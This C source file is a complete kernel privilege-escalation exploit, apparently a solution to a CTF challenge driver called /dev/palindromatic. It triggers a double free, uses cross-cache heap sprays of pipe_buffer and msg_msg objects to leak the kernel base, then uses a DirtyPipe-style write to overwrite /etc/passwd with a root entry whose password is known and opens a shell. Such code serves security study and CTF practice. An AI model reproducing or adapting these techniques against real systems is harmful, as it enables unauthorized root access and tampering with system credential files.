#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/resource.h> 

#define DO_QUEUE     0xb10500a
#define DO_SANITIZE  0xb10500b
#define DO_RESET     0xb10500c
#define DO_PROCESS   0xb10500d
#define DO_REAP      0xb10500e
#define DO_QUERY     0xb10500f

int fd; 
int passwd; 
uint64_t kernel_base = 0x0; 

// SETUP STUFF
void set_fd_limit_max(void) {
    struct rlimit rlim;
    if ((getrlimit(RLIMIT_NOFILE, &rlim)) < 0) {
        perror("getrlimit failed");
        exit(-1); 
    }
    rlim.rlim_cur = rlim.rlim_max;
    
    if ((setrlimit(RLIMIT_NOFILE, &rlim)) < 0) {
        perror("setrlimit failed");
        exit(-1); 
    }
    printf("[+] FD limit set to %ld\n", rlim.rlim_cur);
}

// MSG_MSG STUFF
#define NUM_MSQIDS 2048
#define MSG_TAG 0X41424344
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))
#define PAGE_SIZE 0x1000
int msqid[NUM_MSQIDS];

struct msg_msg {
    uint64_t m_list_next;
    uint64_t m_list_prev;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

struct msg_msgseg {
    uint64_t next;
};

struct {
  long mtype;
  char mtext[0x400 - MSG_MSG_SIZE];
} message; 

struct {
  long mtype;
  char mtext[0x1000 + 0x400 - 48 - 8];
} secondary_msg; 

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
    msg->m_list_next = m_list_next;
    msg->m_list_prev = m_list_prev;
    msg->m_type = 0x42;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = 0;
}

// PIPE BUFFER STUFF
#define NUM_PIPEFDS 0x200
int pipefd[NUM_PIPEFDS+0x60][2];

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

// MODULE STUFF
#define TARGET_SZ   0x400
#define STRING_SZ   ((TARGET_SZ-2*sizeof(unsigned long))/2) // 0x1f8
struct arg_t {
    char * buf; 
};

int do_queue(char * buf) {
    struct arg_t arg; 
    arg.buf = buf; 
    
    if (ioctl(fd, DO_QUEUE, &arg) < 0) {
        perror("[!] Queue failed");
        return -1;
    }
    //printf("[+] Queue successful\n");
    return 0;
}

int do_sanitize(void) {
    if (ioctl(fd, DO_SANITIZE, NULL) < 0) {
        perror("[!] Sanitize failed");
        return -1;
    }
    //printf("[+] Sanitize successful\n");
    return 0;
}

int do_reset(void) {
    if (ioctl(fd, DO_RESET, NULL) < 0) {
        //perror("[!] Reset failed");
        return -1;
    }
    //printf("[+] Reset successful\n");
    return 0;
}

int do_process(void) {
    if (ioctl(fd, DO_PROCESS, NULL) < 0) {
        perror("[!] Process failed");
        return -1;
    }
    //printf("[+] Process successful\n");
    return 0;
}

int do_reap(void) {
    if (ioctl(fd, DO_REAP, NULL) < 0) {
        perror("[!] Reap failed");
        return -1;
    }
    //printf("[+] Reap successful\n");
    return 0;
}

int do_query(void) {
    int ret = 0; 
    ret = ioctl(fd, DO_QUERY, NULL); 
    return ret;
}

int main(void) {
    char buf[0x1f8]; 
    uint64_t number = 0;
    uint64_t count_old = 0; 
    uint64_t count_new = 0; 
    int offset = 0; 
    char stuff[0x100];
    int corrupted = -1; 
    uint64_t leak[0x500];
    int overlap = -1; 

    // Setup
    printf("STAGE 0: SETUP\n"); 
    printf("[+] Initial setup\n");
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
        perror("sched_setaffinity");
        exit(-1);
    }
    
    set_fd_limit_max(); 
    
    // Set up msg_msg queues
    printf("[+] Setting up msg queues\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
            perror("[!] msgget failed");
            exit(-1);
        }
    }
    sleep(1); 
    
    // Set up pipe_buf stuff
    printf("[+] Set up pipe_buf stuff\n"); 
    struct pipe_buffer fake_pipe;
    
    // Open device
    printf("[+] Opening device\n");
    if ((fd = open("/dev/palindromatic", O_RDONLY)) < 0) {
        perror("[!] Failed to open device");
        exit(-1);
    }
    
    // Open target file /etc/passwd
    printf("[+] Opening target file /etc/passwd\n"); 
    if ((passwd = open("/etc/passwd", O_RDONLY)) < 0) {
        perror("[!] Failed to open target file");
        exit(-1);
    }
    sleep(1); 
    
    // STAGE 1: TRIGGER DOUBLE FREE
    printf("STAGE 1: TRIGGER DOUBLE FREE\n");
    printf("[+] Do queue 0x100 times\n"); 
    memset(&buf, 0x41, sizeof(buf)); 
    for (int i = 0; i < 0x100; i++) {
        do_queue(buf);
    } 
    
    printf("[+] Do process 0x30 times\n"); 
    for (int i = 0; i < 0x30; i++) {
        do_process();
    }
    
    printf("[+] Do sanitize\n");
    do_sanitize(); 
    
    printf("[+] Do process 0x10 times\n"); 
    for (int i = 0; i < 0x10; i++) {
        count_old = count_new; 
        count_new = do_query() & 0xff;
        if (count_new == count_old) {
            break; 
        } else {
            offset = offset + 1; 
        }
        do_process(); 
    } 
    printf("[+] Offset: %x\n", offset); 
    
    printf("[+] Do reset to move corrupted request into incoming queue\n"); 
    do_reset(); 
    
    printf("[+] Process all the other incoming requests\n"); 
    for (int i = 0; i < (0x100-0x30-offset); i++) {
        do_process(); 
    }   
    
    // STAGE 2: CROSS CACHE
    printf("STAGE 2: CROSS CACHE\n"); 
    printf("[+] Do reap to free all items in the outgoing queue\n"); 
    for (int i = 0; i < 0x100; i++) {
        do_reap();
    }

    printf("[+] Spraying pipe_buf over freed 1024 area\n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (pipe(pipefd[i]) < 0) {
            perror("[!] pipe");
            exit(-1);
        } 
    }
    sleep(1); 
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (write(pipefd[i][1], "BBBB", 4) < 0) {
            perror("[!] write");
            exit(-1);
        }  
    }
    sleep(1);  
    
    printf("[+] Free a second time using reset\n"); 
    do_reset(); 
    do_reset(); 
    
    printf("[+] Spray another round of pipe_buf to replace double freed object\n"); 
    for (int i = NUM_PIPEFDS; i < NUM_PIPEFDS+0x60; i++) {
        if (pipe(pipefd[i]) < 0) {
            perror("[!] pipe");
            exit(-1);
        } 
    }
    sleep(1); 
    for (int i = NUM_PIPEFDS; i < NUM_PIPEFDS+0x60; i++) {
        if (write(pipefd[i][1], "CCCC", 4) < 0) {
            perror("[!] write");
            exit(-1);
        }  
    }
    sleep(1); 
    
    printf("[+] Find the corrupted pipe_buf object\n"); 
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        memset(&stuff, 0, sizeof(stuff)); 
        read(pipefd[i][0], &stuff, 2); 
        if (stuff[0] == 0x43) {
            corrupted = i; 
        }
    }
    if (corrupted == -1) {
        printf("[!] Pipe corruption failed\n"); 
        exit(-1); 
    }
    printf("[+] Corrupted pipe index: %x\n", corrupted); 
    
    printf("[+] Free one of the two pipe_bufs over the victim\n"); 
    for (int i = 0; i < NUM_PIPEFDS+0x60; i++) {
        if (i == corrupted) {
            continue;
        }
        close(pipefd[i][0]);
        close(pipefd[i][1]);
    }
    sleep(1);    

    printf("[+] Spraying msg_msgseg over victim object\n"); 
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&secondary_msg, 0x5a, sizeof(secondary_msg));
        *(long *)&secondary_msg.mtype = 0x41;
        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;
        if (msgsnd(msqid[i], &secondary_msg, sizeof(secondary_msg) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
        }
    }
    sleep(1);  
    
    printf("[+] Splice pipe\n"); 
    loff_t off = 1;
    if (splice(passwd, &off, pipefd[corrupted][1], NULL, 1, 0) < 0) {
        perror("[!] Splice failed");
    }
    
    printf("[+] Getting a leak of the pipe_buffer object\n"); 
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (msgrcv(msqid[i], &leak, sizeof(secondary_msg) - sizeof(long), 0, MSG_COPY | IPC_NOWAIT) < 0) {
            perror("[!] msgrcv failed");
        }
        if (leak[0x1ff] != 0x5a5a5a5a5a5a5a5a) {
            overlap = i; 
            printf("[+] Found overlapping object at index %x\n", overlap); 
            memcpy(&fake_pipe, &leak[0x1ff], sizeof(fake_pipe)); 
            fake_pipe.flags = 0x10; 
            fake_pipe.offset = 0; 
            fake_pipe.len = 0; 
            printf("[+] Fake pipe_buffer object:\n"); 
            
            for (int j = 0; j < (sizeof(fake_pipe)/8); j++) {
                printf("    0x%llx\n", ((uint64_t *)&fake_pipe)[j]); 
            }
            
            kernel_base = leak[0x201] - 0x12205e0;
            printf("[+] Kernel text base: 0x%llx\n", kernel_base); 
            break; 
        }
    }
    
    // STAGE 3: DIRTYPIPE
    printf("STAGE 3: DIRTYPIPE\n"); 
    
    printf("[+] Free that one specific message\n");
    if (msgrcv(msqid[overlap], &leak, sizeof(secondary_msg)-sizeof(long), 0x41, 0) < 0) {
        perror("[!] Free msg_msg object failed");
    }
    sleep(1);
    
    char msg[0x1500]; 
    memset(&msg, 0x0, sizeof(msg)); 
    memcpy(&(msg[0xff8]), &fake_pipe, sizeof(fake_pipe)); 
    
    printf("[+] Spray new msg_msgseg objects with fake pipe_buffers\n"); 
    memset(&secondary_msg, 0x0, sizeof(secondary_msg));
    memcpy(&secondary_msg, &msg, sizeof(secondary_msg)); 

    printf("[+] Spraying msg_msgseg over victim object\n"); 
    for (int i = 0; i < 0x100; i++) {
        *(long *)&secondary_msg.mtype = 0x42;
        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;
        if (msgsnd(msqid[i], &secondary_msg, sizeof(secondary_msg) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
        }
    }
    sleep(1); 

    printf("[+] Overwrite /etc/passwd\n"); 
    // The creds are root:catcatcat
    char catcatcat[] = "root:$1$KHAVTUKO$GU3BysPeNf8W7hDrzo0bu/:0:0:root:/root:/bin/sh\nuser:x:1000:1000:Linux User,,,:/home/user:/bin/sh";
    write(pipefd[corrupted][1], catcatcat, sizeof(catcatcat));
    
    char content[0x80];
    memset(&content, 0, sizeof(content)); 
    printf("[+] Check contents of /etc/passwd\n"); 
    if (read(passwd, content, 0x80) < 0) {
        perror("[!] read failed");        
    }
    printf("%s\n", content);

    printf("[+] Log in with root:catcatcat\n"); 
    
    if (!fork()) {
        char *argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);
    }
    
    return 0;
}
